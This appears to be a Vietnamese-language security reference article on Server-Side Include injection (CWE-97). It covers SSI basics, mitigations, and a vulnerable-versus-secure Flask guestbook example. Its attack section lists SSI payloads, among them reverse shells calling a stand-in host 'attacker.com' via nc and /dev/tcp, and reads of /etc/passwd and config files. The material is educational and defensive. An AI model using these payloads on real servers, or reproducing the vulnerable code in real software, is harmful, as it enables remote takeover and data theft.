# Server-Side Include (SSI) Injection

> **CWE**: CWE-97 | **Phân loại**: Injection

## Kiến thức Nền tảng

Thuở sơ khai của mạng internet, khi các ngôn ngữ mạnh mẽ như PHP hay ASP chưa phổ biến, các máy chủ web đã sử dụng một công nghệ đơn giản gọi là Server-Side Includes (SSI). Hãy tưởng tượng SSI giống như những nhãn dán hướng dẫn đặc biệt dạng comment HTML (ví dụ: `<!--#echo var="DATE_LOCAL" -->` để hiển thị ngày giờ) được nhúng sẵn trong các tệp tin của trang web (thường có đuôi `.shtml`). Trước khi gửi trang web tới trình duyệt của người dùng, máy chủ sẽ quét qua toàn bộ trang web, tìm các nhãn dán chỉ thị này để chạy các lệnh tương ứng rồi dán kết quả thực tế vào đó. Một trong những chỉ thị mạnh mẽ nhất của SSI là chạy trực tiếp lệnh trên hệ điều hành thông qua lệnh `exec`.

```html
<!-- Normal SSI directives in a .shtml file -->

<!-- Display current date -->
<!--#echo var="DATE_LOCAL" -->

<!-- Include content from another file -->
<!--#include file="header.html" -->

<!-- Include output of a CGI script -->
<!--#include virtual="/cgi-bin/counter.cgi" -->

<!-- Display file size -->
<!--#fsize file="document.pdf" -->

<!-- Execute a system command and embed output -->
<!--#exec cmd="uptime" -->
```

Khi web server nhận request cho file `.shtml`, nó parse toàn bộ nội dung, tìm các directive `<!--#...-->`, thực thi chúng, và thay thế bằng kết quả trước khi trả về cho client. Client chỉ nhận HTML thuần — không thấy SSI directive.

Ví dụ trang web sử dụng SSI để hiển thị footer động:

```html
<!-- page.shtml — using SSI for dynamic footer -->
<html>
<body>
  <h1>Welcome</h1>
  <p>Main content here...</p>
  <footer>
    <!-- SSI directive to include shared footer -->
    <!--#include file="footer.html" -->
    <!-- Display last modified time -->
    <p>Last updated: <!--#echo var="LAST_MODIFIED" --></p>
  </footer>
</body>
</html>
```

## Mô tả lỗ hổng

Lỗ hổng SSI Injection xảy ra khi ứng dụng web nhận thông tin từ người dùng (như tên đăng ký hay lời bình luận) và nhúng trực tiếp chúng vào các tệp tin được xử lý bởi công cụ SSI mà không qua bộ lọc an toàn. Kẻ tấn công có thể khôn khéo nhập vào một dòng chữ trông giống như một chỉ thị SSI độc hại (ví dụ: lệnh thực thi hệ thống `<!--#exec cmd="cat /etc/passwd" -->`). Máy chủ khi quét qua tệp tin sẽ bị đánh lừa và thực thi luôn lệnh của kẻ tấn công trước khi gửi kết quả về cho họ. Lỗ hổng này cực kỳ nguy hiểm vì nó có thể giúp kẻ tấn công đọc được các file cấu hình bí mật trên hệ thống, hoặc tệ hơn là thực thi mã độc từ xa (RCE) để cướp quyền kiểm soát toàn bộ máy chủ web.

## Cơ chế tấn công

**RCE qua exec directive**:

```html
<!-- Attacker submits this as their "name" in a form -->
<!--#exec cmd="id" -->

<!-- If rendered in .shtml page, server executes 'id' command -->
<!-- Output: uid=33(www-data) gid=33(www-data) groups=33(www-data) -->
```

**Reverse shell**:

```html
<!-- Attacker injects reverse shell command -->
<!--#exec cmd="nc -e /bin/bash attacker.com 4444" -->

<!-- Alternative using bash redirect -->
<!--#exec cmd="bash -i >& /dev/tcp/attacker.com/4444 0>&1" -->
```

**Đọc file nhạy cảm qua include directive**:

```html
<!-- Read /etc/passwd via include -->
<!--#include virtual="/etc/passwd" -->

<!-- Read application config -->
<!--#include file="../config/database.yml" -->
```

**Liệt kê thông tin server**:

```html
<!-- Extract server environment variables -->
<!--#echo var="DOCUMENT_ROOT" -->
<!--#echo var="SERVER_SOFTWARE" -->
<!--#echo var="REMOTE_ADDR" -->

<!-- Print all environment variables -->
<!--#printenv -->
```

## Biện pháp phòng thủ

- **Tóm tắt**: Vô hiệu hóa tính năng SSI nếu không sử dụng, hoặc tắt quyền thực thi lệnh và mã hóa dữ liệu người dùng.
- **Các bước chi tiết**:
  - Disable SSI: Nếu không sử dụng, tắt hoàn toàn `mod_include` trong Apache hoặc `ssi off` trong Nginx.
  - Disable `exec` directive: Trong Apache, sử dụng `Options +IncludesNOEXEC` để cho phép SSI nhưng cấm exec.
  - HTML-encode user input: Encode ký tự `<`, `>`, `!`, `#`, `-` trước khi render trong `.shtml`.
  - Không lưu user input vào .shtml files: Tách biệt static SSI template và dynamic user data.
  - Chuyển sang công nghệ hiện đại: Sử dụng template engine (Jinja2, EJS, Blade) thay vì SSI.

## Code Example

```python
# === VULNERABLE CODE ===
from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/guestbook', methods=['POST'])
def guestbook():
    name = request.form.get('name')
    message = request.form.get('message')

    # DANGER: User input written directly to .shtml file
    with open('/var/www/html/guestbook.shtml', 'a') as f:
        f.write(f"<p><b>{name}</b>: {message}</p>\n")

    return "Message posted!"
# Attack: name=<!--#exec cmd="cat /etc/passwd" -->


# === SECURE CODE ===
import html
from flask import Flask, request

app = Flask(__name__)

def sanitize_ssi(text):
    """Remove SSI directives and HTML-encode the input"""
    # HTML-encode to neutralize < > characters
    safe_text = html.escape(text, quote=True)
    return safe_text

@app.route('/guestbook', methods=['POST'])
def guestbook():
    name = request.form.get('name', '')
    message = request.form.get('message', '')

    # Validate input length
    if len(name) > 50 or len(message) > 500:
        return "Input too long", 400

    # Sanitize all user input before writing
    safe_name = sanitize_ssi(name)
    safe_message = sanitize_ssi(message)

    # Write to regular .html file instead of .shtml
    # Even if SSI is enabled, .html files are not parsed by default
    with open('/var/www/html/guestbook.html', 'a') as f:
        f.write(f"<p><b>{safe_name}</b>: {safe_message}</p>\n")

    return "Message posted!"
```

## Xem thêm

- [SSTI](../ssti/) — Khai thác cơ chế thực thi template từ phía máy chủ.

## Nguồn tham khảo

- PortSwigger: https://portswigger.net/web-security/server-side-template-injection
- OWASP: https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection
- CWE: https://cwe.mitre.org/data/definitions/97.html

## Giải thích thuật ngữ

- **SSI (Server-Side Includes)**: Công nghệ nhúng các chỉ thị thực thi động phía máy chủ trong file HTML.
- **SSI Injection**: Tiêm chỉ thị SSI độc hại vào ứng dụng để máy chủ thực thi trái phép.
- **Directive**: Chỉ thị nằm trong cấu trúc comment HTML đặc biệt được SSI quét và chạy.
- **CGI Script**: Giao diện lập trình CGI giúp tạo ra các nội dung web động từ máy chủ.
- **RCE**: Thực thi mã độc tùy ý trên máy chủ từ xa.
